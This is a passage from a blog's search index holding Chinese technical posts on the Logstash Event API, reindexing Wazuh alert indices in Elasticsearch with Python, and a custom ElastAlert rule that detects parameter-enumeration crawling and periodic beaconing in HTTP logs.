<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Logstash Event API</title>
    <url>/2019/12/30/Logstash-Event-API/</url>
    <content><![CDATA[<h4 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h4><p>​        由于项目需要, 用到了<code>Ruby</code>对Logstash进行一些定制化的配置。翻遍了整个Logstash的官方文档, 对于Ruby API的介绍就写了两个方法。<code>get</code> 与 <code>set</code> 也是醉了😂, 幸好谷歌一下…</p>
<h4 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h4><ul>
<li>删除事件：cancel</li>
<li>取消删除事件：uncancel</li>
<li>是否删除：cancelled?</li>
<li>是否包含字段：include?</li>
<li>删除字段：remove</li>
<li>事件转字符串：to_s</li>
<li>事件转hash字典（不含metadata字段）：to_hash</li>
<li>事件转hash字典（含metadata字段）：to_hash_with_metadata</li>
<li>事件转json字符串：to_json</li>
<li>增加tag：tag</li>
<li>取事件时间戳：timestamp</li>
</ul>
<p><strong>更多查询官方接口源码:</strong> <a href="https://github.com/elastic/logstash/blob/master/logstash-core/src/main/java/org/logstash/ext/JrubyEventExtLibrary.java"><strong>JrubyEventExtLibrary.java</strong></a></p>
<h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><ul>
<li><strong><a href="https://blog.csdn.net/mvpboss1004/article/details/78070300">Lostash event API详解</a></strong></li>
<li><a href="https://github.com/elastic/logstash/blob/master/logstash-core/src/main/java/org/logstash/ext/JrubyEventExtLibrary.java"><strong>JrubyEventExtLibrary.java</strong></a></li>
<li><strong><a href="https://www.rubydoc.info/gems/logstash-event/1.1.5/LogStash/Event#cancel-instance_method">Class: LogStash::Event</a></strong></li>
</ul>
]]></content>
      <categories>
        <category>ELK</category>
      </categories>
      <tags>
        <tag>Logstash</tag>
      </tags>
  </entry>
  <entry>
    <title>Elasticsearch-alias与reindex的使用场景</title>
    <url>/2020/03/29/Elasticsearch-alias%E4%B8%8Ereindex%E7%9A%84%E4%BD%BF%E7%94%A8%E5%9C%BA%E6%99%AF/</url>
    <content><![CDATA[<h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><ul>
<li><strong><a href="https://javasgl.github.io/elastic-search-reindex/">使用 reindex 来修改 elasticsearch 索引mapping</a></strong></li>
<li><strong><a href="https://javasgl.github.io/use-alias-migrate-index/">使用 Elasticsearch alias 功能切换 index</a></strong></li>
<li><strong><a href="https://blog.csdn.net/mlljava1111/article/details/51218868">Elasticsearch更改mapping(不停服务重建索引)</a></strong></li>
<li><strong><a href="https://www.cnblogs.com/jajian/p/10152681.html">Elasticsearch 技术分析（三）： 索引别名Aliases问题</a></strong></li>
<li><strong><a href="https://www.jianshu.com/p/f67b046b4d3f">Elasticsearch 实战案例（索引切分、模板、别名、数据迁移）</a></strong></li>
<li><strong><a href="http://abusehub-reindex.py/">abusehub-reindex.py/</a></strong></li>
</ul>
<h4 id="reindex"><a href="#reindex" class="headerlink" title="reindex"></a>reindex</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> elasticsearch <span class="keyword">import</span> Elasticsearch</span><br><span class="line"><span class="keyword">from</span> elasticsearch <span class="keyword">import</span> helpers</span><br><span class="line"></span><br><span class="line">host = [<span class="string">&#x27;es_host1&#x27;</span>, <span class="string">&#x27;es_host2&#x27;</span>, <span class="string">&#x27;es_host3&#x27;</span>]</span><br><span class="line">port = <span class="number">9200</span></span><br><span class="line">timeout = <span class="number">600</span></span><br><span class="line">auth_user = <span class="string">&#x27;elastic&#x27;</span></span><br><span class="line">auth_password = <span class="string">&#x27;hello world&#x27;</span></span><br><span class="line">use_ssl = <span class="literal">True</span></span><br><span class="line">ca_certs = <span class="string">&#x27;/opt/certs/ca/ca.crt&#x27;</span></span><br><span class="line"></span><br><span class="line">es = Elasticsearch(host, port=port, timeout=timeout, http_auth=(auth_user, auth_password), verify_certs=<span class="literal">True</span>, use_ssl=use_ssl, ca_certs=ca_certs)</span><br></pre></td></tr></table></figure>



<h5 id="按照指定日期重建索引"><a href="#按照指定日期重建索引" class="headerlink" title="按照指定日期重建索引"></a>按照指定日期重建索引</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">begin_date = (datetime.datetime.now() - datetime.timedelta(days = <span class="number">10</span>)).strftime(<span class="string">&quot;%Y.%m.%d&quot;</span>)</span><br><span class="line">begin_date = datetime.datetime.strptime(begin_date, <span class="string">&quot;%Y.%m.%d&quot;</span>)</span><br><span class="line">end_date = (datetime.datetime.now() - datetime.timedelta(days = <span class="number">1</span>)).strftime(<span class="string">&quot;%Y.%m.%d&quot;</span>)</span><br><span class="line">end_date = datetime.datetime.strptime(end_date, <span class="string">&quot;%Y.%m.%d&quot;</span>)</span><br><span class="line"></span><br><span class="line">date_list = []</span><br><span class="line"><span class="keyword">while</span> begin_date &lt;= end_date:</span><br><span class="line">    date_str = begin_date.strftime(<span class="string">&quot;%Y.%m.%d&quot;</span>)</span><br><span class="line">    date_list.append(date_str)</span><br><span class="line">    begin_date += datetime.timedelta(days=<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">date_list</span><br><span class="line">[<span class="string">&#x27;2020.03.19&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;2020.03.20&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;2020.03.21&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;2020.03.22&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;2020.03.23&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;2020.03.24&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;2020.03.25&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;2020.03.26&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;2020.03.27&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;2020.03.28&#x27;</span>]</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">chunk_size = <span class="number">10000</span></span><br><span class="line"><span class="keyword">for</span> day <span class="keyword">in</span> date_list:</span><br><span class="line">    source_index = <span class="string">&#x27;wazuh-alerts-3.x-&#x27;</span> + day</span><br><span class="line">    target_index = <span class="string">&#x27;siem-alerts-&#x27;</span> + day</span><br><span class="line">    helpers.reindex(</span><br><span class="line">        client=es, source_index=source_index, target_index=target_index, </span><br><span class="line">        target_client=es, chunk_size=chunk_size</span><br><span class="line">    )</span><br><span class="line">    <span class="built_in">print</span>(source_index + <span class="string">&#x27; -&gt; &#x27;</span> + target_index + <span class="string">&#x27; fin.&#x27;</span>)</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>ElasticSearch</tag>
      </tags>
  </entry>
  <entry>
    <title>为 Elastalert 增加 参数遍历、周期性检测规则</title>
    <url>/2020/06/02/Elastalert-%E6%96%B0%E5%A2%9E%E5%91%A8%E6%9C%9F%E6%80%A7%E6%A3%80%E6%B5%8B%E8%A7%84%E5%88%99/</url>
    <content><![CDATA[<h4 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h4><p>​        由于AWS流量镜像的特殊性，现阶段生产网的架构中只接入了<strong>HTTP</strong>与<strong>DNS</strong>流量，分别采用了<strong>Zeek</strong>与<strong>Suricata</strong>对现有流量进行分析与预警。<strong>Suricata</strong>负责基于签名的特征检测，<strong>Zeek</strong>负责定制化事件的脚本检测，也算是“各司其职”。近几日，某个业务接口出现了Pindom告警，经过分析发现部分IP尝试对该接口的参数进行遍历。由于遍历参数对应的值设置的都比较大，且后台并未对该参数进行深度的限制，导致了服务器会不断的进行计算，最终导致接口无响应。</p>
<h4 id="需求"><a href="#需求" class="headerlink" title="需求"></a>需求</h4><ul>
<li>检测<strong>参数遍历</strong>行为；</li>
<li>访问是否存在<strong>周期性</strong>；</li>
<li>unique user_agent 统计；</li>
<li>threat intelligence 研判；</li>
</ul>
<h4 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h4><p>​        通过扩展**<a href="https://github.com/Yelp/elastalert">ElastAlert</a>**告警框架的告警模型，来实现以上需求。</p>
<h5 id="参数遍历"><a href="#参数遍历" class="headerlink" title="参数遍历"></a>参数遍历</h5><ul>
<li><h6 id="新增规则-Spider-py"><a href="#新增规则-Spider-py" class="headerlink" title="新增规则 - Spider.py"></a>新增规则 - Spider.py</h6></li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> redis</span><br><span class="line"><span class="keyword">import</span> html</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Process, JoinableQueue, Lock, Manager</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> elastalert.ruletypes <span class="keyword">import</span> RuleType</span><br><span class="line"><span class="keyword">from</span> elastalert.util <span class="keyword">import</span> elastalert_logger</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Please make sure you have pandas installed. pip install pandas&quot;</span>)</span><br><span class="line">    sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Please make sure you have tqdm module installed. pip install tqdm&quot;</span>)</span><br><span class="line">    sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">conn</span>(<span class="params">host=<span class="string">&#x27;localhost&#x27;</span>, port=<span class="number">6379</span>, password=<span class="literal">None</span>, db=<span class="number">0</span></span>):</span></span><br><span class="line">    pool = redis.ConnectionPool(host=host, port=port, password=password, db=db)</span><br><span class="line">    conn = redis.Redis(connection_pool=pool)</span><br><span class="line">    <span class="keyword">return</span> conn</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">put_data</span>(<span class="params">conn, q, data</span>):</span></span><br><span class="line">    <span class="keyword">with</span> conn.pipeline() <span class="keyword">as</span> pipe:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">            pipe.lpush(q, i)</span><br><span class="line">        pipe.execute()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SpiderRule</span>(<span class="params">RuleType</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, rules, args=<span class="literal">None</span></span>):</span></span><br><span class="line">        <span class="built_in">super</span>(SpiderRule, self).__init__(rules, args=<span class="literal">None</span>)</span><br><span class="line">        self.MAX_ARGS_LENGTH = <span class="built_in">int</span>(self.rules[<span class="string">&#x27;beacon&#x27;</span>][<span class="string">&#x27;max_args_length&#x27;</span>])</span><br><span class="line">        self.MIN_HITS = <span class="built_in">int</span>(self.rules[<span class="string">&#x27;beacon&#x27;</span>][<span class="string">&#x27;min_hits&#x27;</span>])</span><br><span class="line">        self.MAX_UNIQUE_ARGS = <span class="built_in">int</span>(self.rules[<span class="string">&#x27;beacon&#x27;</span>][<span class="string">&#x27;max_unique_args&#x27;</span>])</span><br><span class="line">        self.THRESHOLD_PERCENT = <span class="built_in">int</span>(self.rules[<span class="string">&#x27;beacon&#x27;</span>][<span class="string">&#x27;threshold_percent&#x27;</span>])</span><br><span class="line">        self.NUM_PROCESSES = <span class="built_in">int</span>(self.rules[<span class="string">&#x27;beacon&#x27;</span>][<span class="string">&#x27;threads&#x27;</span>])</span><br><span class="line">        self.UA_PROCESSES = <span class="built_in">int</span>(self.rules[<span class="string">&#x27;beacon&#x27;</span>][<span class="string">&#x27;user_agent&#x27;</span>])</span><br><span class="line"></span><br><span class="line">        self.TIMESTAMP = <span class="string">&#x27;@timestamp&#x27;</span></span><br><span class="line">        self.FORMAT_TIMESTAMP = self.rules[<span class="string">&#x27;timestamp&#x27;</span>].get(<span class="string">&#x27;format&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line"></span><br><span class="line">        self.beacon_module = self.rules[<span class="string">&#x27;beacon&#x27;</span>][<span class="string">&#x27;beacon_module&#x27;</span>]</span><br><span class="line">        self.WINDOW = <span class="built_in">int</span>(self.rules[<span class="string">&#x27;beacon&#x27;</span>][<span class="string">&#x27;window&#x27;</span>])</span><br><span class="line">        self.MIN_INTERVAL = <span class="built_in">int</span>(self.rules[<span class="string">&#x27;beacon&#x27;</span>][<span class="string">&#x27;min_interval&#x27;</span>])</span><br><span class="line">        buffer_time = <span class="built_in">str</span>(self.rules[<span class="string">&#x27;buffer_time&#x27;</span>])</span><br><span class="line">        self.PERIOD = <span class="string">&#x27;:&#x27;</span>.join(buffer_time.split(<span class="string">&#x27;:&#x27;</span>)[:<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line">        self.fields = self.normalized_field(self.rules[<span class="string">&#x27;field&#x27;</span>])</span><br><span class="line">        self.src_ip = self.fields[<span class="string">&#x27;aliases&#x27;</span>][<span class="string">&#x27;src_ip&#x27;</span>]</span><br><span class="line">        self.url = self.fields[<span class="string">&#x27;aliases&#x27;</span>][<span class="string">&#x27;url&#x27;</span>]</span><br><span class="line">        self.url_path = self.fields[<span class="string">&#x27;aliases&#x27;</span>][<span class="string">&#x27;url_path&#x27;</span>]</span><br><span class="line">        self.http_host = self.fields[<span class="string">&#x27;aliases&#x27;</span>][<span class="string">&#x27;http_host&#x27;</span>]</span><br><span class="line">        self.user_agent = self.fields[<span class="string">&#x27;aliases&#x27;</span>][<span class="string">&#x27;user_agent&#x27;</span>]</span><br><span class="line"></span><br><span class="line">        self.json = self.rules[<span class="string">&#x27;output&#x27;</span>][<span class="string">&#x27;json&#x27;</span>].get(<span class="string">&#x27;enable&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">        self.redis = self.rules[<span class="string">&#x27;output&#x27;</span>][<span class="string">&#x27;redis&#x27;</span>].get(<span class="string">&#x27;enable&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line"></span><br><span class="line">        self.q_job = JoinableQueue()</span><br><span class="line">        self.l_df = Lock()</span><br><span class="line">        self.l_list = Lock()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">normalized_field</span>(<span class="params">self, d</span>):</span></span><br><span class="line">        fields = &#123;<span class="string">&#x27;hash&#x27;</span>: [], <span class="string">&#x27;output&#x27;</span>: [], <span class="string">&#x27;aliases&#x27;</span>: &#123;&#125;&#125;</span><br><span class="line">        <span class="keyword">for</span> field, info <span class="keyword">in</span> d.items():</span><br><span class="line">            alias = info[<span class="string">&#x27;alias&#x27;</span>]</span><br><span class="line">            fields[<span class="string">&#x27;aliases&#x27;</span>][alias] = field</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> info.get(<span class="string">&#x27;type&#x27;</span>, []):</span><br><span class="line">                fields[i].append(field)</span><br><span class="line">        <span class="keyword">return</span> fields</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">add_data</span>(<span class="params">self, data</span>):</span></span><br><span class="line">        <span class="comment"># Detection of spider crawlers</span></span><br><span class="line">        self.df = pd.json_normalize(data)</span><br><span class="line">        results = self.find_spiders()</span><br><span class="line"></span><br><span class="line">        d = results.to_dict(orient=<span class="string">&quot;records&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Output to local files</span></span><br><span class="line">        <span class="keyword">if</span> self.json:</span><br><span class="line">            json_path = self.rules[<span class="string">&#x27;output&#x27;</span>][<span class="string">&#x27;json&#x27;</span>][<span class="string">&#x27;path&#x27;</span>]</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(json_path, <span class="string">&#x27;a&#x27;</span>) <span class="keyword">as</span> out_file:</span><br><span class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> d:</span><br><span class="line">                    out_file.write(json.dumps(i) + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Output to Redis Server</span></span><br><span class="line">        <span class="keyword">if</span> self.redis:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                host = self.rules[<span class="string">&#x27;output&#x27;</span>][<span class="string">&#x27;redis&#x27;</span>][<span class="string">&#x27;host&#x27;</span>]</span><br><span class="line">                port = self.rules[<span class="string">&#x27;output&#x27;</span>][<span class="string">&#x27;redis&#x27;</span>][<span class="string">&#x27;port&#x27;</span>]</span><br><span class="line">                password = self.rules[<span class="string">&#x27;output&#x27;</span>][<span class="string">&#x27;redis&#x27;</span>][<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">                db = self.rules[<span class="string">&#x27;output&#x27;</span>][<span class="string">&#x27;redis&#x27;</span>][<span class="string">&#x27;db&#x27;</span>]</span><br><span class="line">                key = self.rules[<span class="string">&#x27;output&#x27;</span>][<span class="string">&#x27;redis&#x27;</span>][<span class="string">&#x27;key&#x27;</span>]</span><br><span class="line">                ioc = self.rules[<span class="string">&#x27;output&#x27;</span>][<span class="string">&#x27;redis&#x27;</span>][<span class="string">&#x27;field&#x27;</span>]</span><br><span class="line"></span><br><span class="line">                redis_conn = conn(host=host, port=port,</span><br><span class="line">                                  password=password, db=db)</span><br><span class="line">                IoC = results[ioc].unique().tolist()</span><br><span class="line">                put_data(redis_conn, key, IoC)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                elastalert_logger.error(<span class="string">&quot;Output Redis configuration errors.&quot;</span>)</span><br><span class="line">        self.add_match(d)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># The results of get_match_str will appear in the alert text</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_match_str</span>(<span class="params">self, match</span>):</span></span><br><span class="line">        <span class="keyword">return</span> json.dumps(match)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">add_match</span>(<span class="params">self, results</span>):</span></span><br><span class="line">        <span class="keyword">for</span> result <span class="keyword">in</span> results:</span><br><span class="line">            <span class="built_in">super</span>(SpiderRule, self).add_match(result)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_args_hash</span>(<span class="params">self, args, session_id</span>):</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">hash</span>(<span class="built_in">tuple</span>(args + [session_id]))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_query_str</span>(<span class="params">self, request</span>):</span></span><br><span class="line">        query = request.split(<span class="string">&#x27;?&#x27;</span>)[-<span class="number">1</span>]</span><br><span class="line">        query_str = <span class="built_in">dict</span>([i.split(<span class="string">&quot;=&quot;</span>, <span class="number">1</span>) <span class="keyword">for</span> i <span class="keyword">in</span> query.split(</span><br><span class="line">            <span class="string">&quot;&amp;&quot;</span>) <span class="keyword">if</span> i <span class="keyword">if</span> <span class="built_in">len</span>(i.split(<span class="string">&quot;=&quot;</span>, <span class="number">1</span>)) == <span class="number">2</span>])</span><br><span class="line">        query_str[<span class="string">&#x27;args_list&#x27;</span>] = <span class="built_in">list</span>(query_str.keys())</span><br><span class="line">        query_str[<span class="string">&#x27;max_length&#x27;</span>] = <span class="built_in">len</span>(query_str)</span><br><span class="line">        query_str[<span class="string">&#x27;url_sample&#x27;</span>] = request</span><br><span class="line">        <span class="keyword">return</span> query_str</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">percent_grouping</span>(<span class="params">self, d, total</span>):</span></span><br><span class="line">        interval = <span class="number">0</span></span><br><span class="line">        <span class="comment"># Finding the key with the largest value (interval with most events)</span></span><br><span class="line">        mx_key = <span class="built_in">int</span>(<span class="built_in">max</span>(<span class="built_in">iter</span>(<span class="built_in">list</span>(d.keys())), key=(<span class="keyword">lambda</span> key: d[key])))</span><br><span class="line">        mx_percent = <span class="number">0.0</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(mx_key - self.WINDOW, mx_key + <span class="number">1</span>):</span><br><span class="line">            current = <span class="number">0</span></span><br><span class="line">            <span class="comment"># Finding center of current window</span></span><br><span class="line">            curr_interval = i + <span class="built_in">int</span>(self.WINDOW / <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i, i + self.WINDOW):</span><br><span class="line">                <span class="keyword">if</span> j <span class="keyword">in</span> d:</span><br><span class="line">                    current += d[j]</span><br><span class="line"></span><br><span class="line">            percent = <span class="built_in">float</span>(current) / total * <span class="number">100</span></span><br><span class="line">            <span class="keyword">if</span> percent &gt; mx_percent:</span><br><span class="line">                mx_percent = percent</span><br><span class="line">                interval = curr_interval</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> interval, mx_percent</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">find_beacon</span>(<span class="params">self, session_data</span>):</span></span><br><span class="line">        beacon = &#123;&#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.FORMAT_TIMESTAMP:</span><br><span class="line">            session_data[self.TIMESTAMP] = pd.to_datetime(</span><br><span class="line">                session_data[self.TIMESTAMP])</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            session_data[self.TIMESTAMP] = pd.to_datetime(</span><br><span class="line">                session_data[self.TIMESTAMP], <span class="built_in">format</span>=self.FORMAT_TIMESTAMP)</span><br><span class="line">        session_data[self.TIMESTAMP] = (</span><br><span class="line">            session_data[self.TIMESTAMP].astype(<span class="built_in">int</span>) / <span class="number">1000000000</span>).astype(<span class="built_in">int</span>)</span><br><span class="line"></span><br><span class="line">        session_data = session_data.sort_values([self.TIMESTAMP])</span><br><span class="line">        session_data[<span class="string">&#x27;delta&#x27;</span>] = (</span><br><span class="line">            session_data[self.TIMESTAMP] - session_data[self.TIMESTAMP].shift()).fillna(<span class="number">0</span>)</span><br><span class="line">        session_data = session_data[<span class="number">1</span>:]</span><br><span class="line">        d = <span class="built_in">dict</span>(session_data.delta.value_counts())</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> key <span class="keyword">in</span> <span class="built_in">list</span>(d.keys()):</span><br><span class="line">            <span class="keyword">if</span> key &lt; self.MIN_INTERVAL:</span><br><span class="line">                <span class="keyword">del</span> d[key]</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Finding the total number of events</span></span><br><span class="line">        total = <span class="built_in">sum</span>(d.values())</span><br><span class="line">        <span class="keyword">if</span> d <span class="keyword">and</span> total &gt; self.MIN_HITS:</span><br><span class="line">            window, percent = self.percent_grouping(d, total)</span><br><span class="line">            <span class="keyword">if</span> percent &gt; self.THRESHOLD_PERCENT <span class="keyword">and</span> total &gt; self.MIN_HITS:</span><br><span class="line">                beacon = &#123;</span><br><span class="line">                    <span class="string">&#x27;percent&#x27;</span>: <span class="built_in">int</span>(percent),</span><br><span class="line">                    <span class="string">&#x27;interval&#x27;</span>: <span class="built_in">int</span>(window),</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> beacon</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">find_spider</span>(<span class="params">self, q_job, spider_list</span>):</span></span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> q_job.empty():</span><br><span class="line">            session_id = q_job.get()</span><br><span class="line">            self.l_df.acquire()</span><br><span class="line">            session_data = self.df[self.df[<span class="string">&#x27;session_id&#x27;</span>]</span><br><span class="line">                                   == session_id]</span><br><span class="line">            self.l_df.release()</span><br><span class="line"></span><br><span class="line">            query_str = session_data[self.url].apply(</span><br><span class="line">                <span class="keyword">lambda</span> req: self.get_query_str(req)).tolist()</span><br><span class="line">            query_data = pd.DataFrame(query_str)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># get args_hash</span></span><br><span class="line">            query_data[<span class="string">&#x27;args_hash&#x27;</span>] = query_data[<span class="string">&#x27;args_list&#x27;</span>].apply(</span><br><span class="line">                <span class="keyword">lambda</span> args: self.get_args_hash(args, session_id))</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> query_data[<span class="string">&#x27;args_hash&#x27;</span>].unique():</span><br><span class="line">                result = &#123;</span><br><span class="line">                    <span class="string">&quot;detail&quot;</span>: &#123;</span><br><span class="line">                        <span class="string">&#x27;percent&#x27;</span>: &#123;&#125;,</span><br><span class="line">                        <span class="string">&#x27;unique&#x27;</span>: &#123;&#125;</span><br><span class="line">                    &#125;,</span><br><span class="line">                    <span class="string">&quot;tags&quot;</span>: [],</span><br><span class="line">                    <span class="string">&quot;src_ip&quot;</span>: session_data[self.src_ip].tolist()[<span class="number">0</span>],</span><br><span class="line">                    <span class="string">&quot;url_path&quot;</span>: session_data[self.url_path].tolist()[<span class="number">0</span>],</span><br><span class="line">                    <span class="string">&quot;http_host&quot;</span>: session_data[self.http_host].tolist()[<span class="number">0</span>],</span><br><span class="line">                    <span class="string">&quot;unique_ua&quot;</span>: session_data[self.user_agent].unique().shape[<span class="number">0</span>],</span><br><span class="line">                    <span class="string">&quot;alert&quot;</span>: <span class="literal">False</span>,</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                df = query_data[query_data[<span class="string">&#x27;args_hash&#x27;</span>] == i]</span><br><span class="line">                count_args_length = df[<span class="string">&#x27;max_length&#x27;</span>].iloc[<span class="number">0</span>]</span><br><span class="line">                <span class="keyword">if</span> count_args_length &gt; self.MAX_ARGS_LENGTH:</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">                total_hits = df.shape[<span class="number">0</span>]</span><br><span class="line">                <span class="keyword">if</span> total_hits &lt; self.MIN_HITS:</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">                args_list = df[<span class="string">&#x27;args_list&#x27;</span>].iloc[<span class="number">0</span>]</span><br><span class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> args_list:</span><br><span class="line">                    unique_args = <span class="built_in">len</span>(df[i].unique())</span><br><span class="line">                    <span class="keyword">if</span> unique_args == <span class="number">1</span>:</span><br><span class="line">                        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">                    <span class="comment"># Calculate the percentage based on the number of changes in the parameters</span></span><br><span class="line">                    current_percent = <span class="built_in">int</span>((unique_args / total_hits) * <span class="number">100</span>)</span><br><span class="line">                    <span class="keyword">if</span> current_percent &lt; self.THRESHOLD_PERCENT:</span><br><span class="line">                        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">                    result[<span class="string">&#x27;detail&#x27;</span>][<span class="string">&#x27;percent&#x27;</span>][i] = current_percent</span><br><span class="line">                    result[<span class="string">&#x27;detail&#x27;</span>][<span class="string">&#x27;unique&#x27;</span>][i] = unique_args</span><br><span class="line"></span><br><span class="line">                    <span class="comment"># Number of parameters with changes</span></span><br><span class="line">                    count_unique_args = <span class="built_in">len</span>(result[<span class="string">&#x27;detail&#x27;</span>][<span class="string">&#x27;unique&#x27;</span>])</span><br><span class="line">                    <span class="keyword">if</span> count_unique_args &lt;= self.MAX_UNIQUE_ARGS:</span><br><span class="line">                        result[<span class="string">&#x27;alert&#x27;</span>] = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> result[<span class="string">&#x27;detail&#x27;</span>][<span class="string">&#x27;unique&#x27;</span>]:</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">                <span class="comment"># Beacon analysis</span></span><br><span class="line">                <span class="keyword">if</span> self.beacon_module:</span><br><span class="line">                    result[<span class="string">&#x27;beacon&#x27;</span>] = self.find_beacon(</span><br><span class="line">                        session_data.reset_index(drop=<span class="literal">True</span>))</span><br><span class="line"></span><br><span class="line">                result[<span class="string">&#x27;args_list&#x27;</span>] = args_list</span><br><span class="line">                result[<span class="string">&#x27;total_hits&#x27;</span>] = total_hits</span><br><span class="line">                result[<span class="string">&#x27;url_sample&#x27;</span>] = df[<span class="string">&#x27;url_sample&#x27;</span>].iloc[<span class="number">0</span>]</span><br><span class="line">                result[<span class="string">&#x27;period&#x27;</span>] = self.PERIOD</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> result[<span class="string">&#x27;alert&#x27;</span>]:</span><br><span class="line">                    result[<span class="string">&#x27;tags&#x27;</span>].append(<span class="string">&#x27;enumerate&#x27;</span>)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> result[<span class="string">&#x27;beacon&#x27;</span>]:</span><br><span class="line">                    result[<span class="string">&#x27;tags&#x27;</span>].append(<span class="string">&#x27;beacon&#x27;</span>)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> result[<span class="string">&#x27;unique_ua&#x27;</span>] &gt;= self.UA_PROCESSES:</span><br><span class="line">                    result[<span class="string">&#x27;tags&#x27;</span>].append(<span class="string">&#x27;suspicious-ua&#x27;</span>)</span><br><span class="line"></span><br><span class="line">                self.l_list.acquire()</span><br><span class="line">                spider_list.append(result)</span><br><span class="line">                self.l_list.release()</span><br><span class="line">            q_job.task_done()</span><br><span 